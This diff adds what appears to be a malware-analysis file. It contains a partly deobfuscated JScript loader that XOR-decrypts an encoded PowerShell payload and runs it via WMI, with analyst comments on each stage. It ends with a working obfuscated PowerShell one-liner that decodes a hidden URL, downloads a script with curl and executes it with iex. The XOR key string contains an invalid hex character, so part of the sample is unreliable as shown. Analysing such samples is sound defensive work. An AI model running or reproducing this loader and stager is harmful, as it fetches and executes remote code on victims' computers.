@@ -1,0 +1,115 @@
+//update.js UNID Malware
+
+// JScript to be run by cscript.exe or wscript.exe
+
+// Helper function to convert a hexadecimal string to a byte array (array of numbers)
+function hex_string_to_byte_array(hex_str) {
+    if (typeof hex_str !== 'string') {
+        throw new Error('Input must be a string.');
+    }
+    if (hex_str.length % 2 !== 0) {
+        // Original script had a stricter check, but this is common
+        throw new Error('Hex string must have an even length.');
+    }
+    var bytes = [];
+    for (var i = 0; i < hex_str.length; i += 2) {
+        var byte_val = parseInt(hex_str.substring(i, i + 2), 16);
+        if (isNaN(byte_val)) {
+            throw new Error("Invalid hexadecimal pair: " + hex_str.substring(i, i + 2));
+        }
+        bytes.push(byte_val);
+    }
+    return bytes;
+}
+
+// --- Stage 1: Define the components for the PowerShell payload ---
+
+// These strings were originally obtained by decoding other obfuscated strings.
+// For the XOR decryption loop, the original script used decoder_2 to get "length" and "fromCharCode".
+var DSTR_length = "length";
+var DSTR_fromCharCode = "fromCharCode";
+
+// Part 1 of the XORed payload (as a hex string)
+var hex_payload_part1_str = '3B6F731E023D460C233E381C0C201A1C584922355152082053256F541D0028106A18195E360C0436752D4D7951295203233E253A173A11043D295C20791C1A03344E183352185D767C645B5A7D5A5D1E6A785D6579704442421C550C4B6868646E0F785655047C565F7F705E52635E475F0355486E5E7A6E62476A4F784360477E4E7A7E6E4A7A55767C5E65057E65517C4A5006536207004D7C474A5E60746F016C6071645060465E7E4B63057068746E4D5B4A7F5070764A7C6D747B45055B025B7C5907766F555645676375580D4778496A4D4E49566866675F18717D590F797951614D487F78604D6E557E4F54197C40705E607B047E4053684B020D053E213040726D4A1F032725042B1C737D440A0A0579242C132030204868704D19595F02091C5330411F5220350455140E2D104132021F0D3D260B155C5D1C080801140A335A1F43052158622A1F09040A0C1A381321061F21411946372C032B0426115073361C1C1120391A284F6609280328225E153E26343056430A293B1E031B05315D3B2C48212C183434287E771F5D230E592B211E435E6D624A77672B470C250A2418096A731516003C3121051339401F6F58541618111F3F0433044A2A151B301F452A511C4961280D334A1917540B292601542D1F656B4F6537053716580116505101413321251B1A5362381F644254120B0A11083F3F385833477F0C546A5A6A2C2A143C2D1D6B7F6067517353190B6A6C4F6C4252727D527813146701471B73737501666F454C15737D22305D30283843581E393E35206D5E2D41092D180A144D';
+// Key for the XOR decryption (as a hex string)
+var hex_payload_key_str = '574F577263443365494C57726B507271656E574G7672335336514235716949634A686B3142636A45554E69517545337A56574F48785476745544754C4238796A433469436F306F4244527768496D6932584C6A545542707A76306738735944565A394F7A67304B66734D4466674F6C736632797A5A664F4250735279547154704F62484A5973566742446B49374A5467507864306A4E3534754D6B786A574D43335851464862547767527957344644465A7569664D644742664E594C4969376F3168506B334E5A7964715452596A39704A65587979717A5A52506A3443496F37554B65577A644D4C567542674A796D354E74426E4C49304C737A536F6E6676564356374F456D7A71534C63446F5451636D6F71544741774C55546F414B696930397165783158306B335656397177675A6A30423979624F436A763475387A67746E6D45377A636C4F78465A766F776668785062556769426862624F4664476D45796D574473696B474F774D744264597750573773594D4D466B6767584F667672635636425A637A4F7055467556536737446230484933716D5A52634C434D31744266517168575778677444444863745239695478706F696970546D49396E4C63635773304330617245436B5A306D6637694C4C65334544573672414E744F7933686C6B757432504A486C736E454A734379706B7862726958535633557A4E377A4E72314F42754E70354357525761537839385A456F41627A434D6258383455346E325A585264414462325A555242324447563078334C4D50424D7A5430714273636E64';
+
+// Convert hex strings to byte arrays
+var payload_bytes_1 = hex_string_to_byte_array(hex_payload_part1_str);
+var key_bytes = hex_string_to_byte_array(hex_payload_key_str);
+
+// Perform XOR decryption to get the Base64 encoded PowerShell payload
+var final_base64_powershell_payload = '';
+for (var i = 0; i < payload_bytes_1[DSTR_length]; i++) { // DSTR_length is "length"
+    final_base64_powershell_payload += String[DSTR_fromCharCode]( // DSTR_fromCharCode is "fromCharCode"
+        payload_bytes_1[i] ^ key_bytes[i % key_bytes[DSTR_length]] // DSTR_length is "length"
+    );
+}
+// At this point, final_base64_powershell_payload contains the actual PowerShell script, Base64 encoded.
+// For your research, you would decode this Base64 string to see the PowerShell commands.
+
+// --- Stage 2: Prepare for WMI Execution ---
+
+// These strings were originally obtained by decoding 'initial_encoded_strings_1' using 'decoder_1'
+var wmi_object_path = "WinMgmts:\\\\.\\root\\cimv2:Win32_Process";
+var powershell_executable_name = "powershell.exe";
+var powershell_encoding_argument = " -enc ";
+var unused_application = "notepad"; // This was decoded but not used in the final effective command
+
+// Assemble the parameters for WMI command construction
+// This matches the order in the original `gqzoxvibpcsjrwln` array
+var wmi_command_components = [
+    wmi_object_path,                 // Index 0
+    powershell_executable_name,      // Index 1
+    powershell_encoding_argument,    // Index 2
+    final_base64_powershell_payload, // Index 3
+    unused_application               // Index 4
+];
+
+// --- Stage 3: Construct the command string for WMI's Create method ---
+
+// The original script used a loop that effectively did the following for its final assignment:
+// var constructed_command = wmi_command_components[2] + wmi_command_components[1] + wmi_command_components[3];
+// This results in: " -enc " + "powershell.exe" + "<BASE64_PAYLOAD>"
+var command_to_execute_via_wmi = wmi_command_components[2] +  // " -enc "
+                                 wmi_command_components[1] +  // "powershell.exe"
+                                 wmi_command_components[3];  // final_base64_powershell_payload
+
+// --- Stage 4: Attempt WMI Execution ---
+try {
+    var wmi_service = GetObject(wmi_command_components[0]); // GetObject("WinMgmts:\\\\.\\root\\cimv2:Win32_Process")
+
+    // The original script had two Create calls here with out-of-bounds indices.
+    // These would have resulted in errors or no-ops (Create(undefined)).
+    // e.g., wmi_service.Create(wmi_command_components[1135]); // Simplified from original calculation
+    // e.g., wmi_service.Create(wmi_command_components[111547]);// Simplified from original calculation
+
+    // This is the actual command execution attempt:
+    wmi_service.Create(command_to_execute_via_wmi);
+
+    // For research:
+    // WScript.Echo("Attempted WMI Command: " + command_to_execute_via_wmi);
+    // This command is malformed. It tries to run a program named " -enc " (with a leading space)
+    // and passes "powershell.exe<BASE64_PAYLOAD>" as arguments. This will likely fail.
+
+    // The LIKELY INTENDED command was probably:
+    // var intended_command = powershell_executable_name + powershell_encoding_argument + final_base64_powershell_payload;
+    // (i.e., "powershell.exe -enc <BASE64_PAYLOAD>")
+    // WScript.Echo("Likely Intended WMI Command: " + intended_command);
+
+} catch (e) {
+    // Error handling, e.g., WScript.Echo("WMI Execution Error: " + e.description);
+}
+
+// To see the Base64 PowerShell payload for further analysis:
+// WScript.Echo("Base64 Encoded PowerShell Payload:\n" + final_base64_powershell_payload);
+
+Save the code above as a .js file (e.g., deobfuscated_malware.js).
+Crucially, to get the actual PowerShell payload, you need to decode the final_base64_powershell_payload string. You can do this by:
+Adding WScript.Echo(final_base64_powershell_payload); at the end of the script and running it with cscript.exe deobfuscated_malware.js in a safe, isolated environment (like a virtual machine disconnected from the internet).
+Copying the final_base64_powershell_payload string from the script (if you run the generation part in a browser console, for instance) and using an online Base64 decoder or a tool like CyberChef.
+Analyze the decoded PowerShell script. This will be the next stage of the malware.
+
+//.ps script
+conhost --headless powershell $layuijrongphm='ur' ;set-alias protons c$($layuijrongphm)l;$ciwzqp=(2486,2474,2471,2484,2481,2467,2470,2485,2491,2485,2486,2471,2479,2485,2416,2469,2481,2479,2417,2419,2416,2482,2474,2482,2433,2485,2431,2472,2478,2475,2468,2467,2468,2469,2420,2423);$lkshbfw=('ertigos','get-cmdlet');$pifsldbhqtavc=$ciwzqp;foreach($rouzgvme in $pifsldbhqtavc){$xjglich=$rouzgvme;$mqtxuifgkyv=$mqtxuifgkyv+[char]($xjglich-2370);$fvxgluia=$mqtxuifgkyv; $yqxokiz=$fvxgluia};$kfiztqcbejdgh[2]=$yqxokiz;$usckmwi='rl';$yshcaglnkf=1;.$([char](((200 + 30) - (100 + 25)))+'e'+'x')(protons -useb $yqxokiz)
+powershell $layuijrongphm='ur' ;set-alias protons c$($layuijrongphm)l;$ciwzqp=(2486,2474,2471,2484,2481,2467,2470,2485,2491,2485,2486,2471,2479,2485,2416,2469,2481,2479,2417,2419,2416,2482,2474,2482,2433,2485,2431,2472,2478,2475,2468,2467,2468,2469,2420,2423);$lkshbfw=('ertigos','get-cmdlet');$pifsldbhqtavc=$ciwzqp;foreach($rouzgvme in $pifsldbhqtavc){$xjglich=$rouzgvme;$mqtxuifgkyv=$mqtxuifgkyv+[char]($xjglich-2370);$fvxgluia=$mqtxuifgkyv; $yqxokiz=$fvxgluia};$kfiztqcbejdgh[2]=$yqxokiz;$usckmwi='rl';$yshcaglnkf=1;.$([char](((200 + 30) - (100 + 25)))+'e'+'x')(protons -useb $yqxokiz)
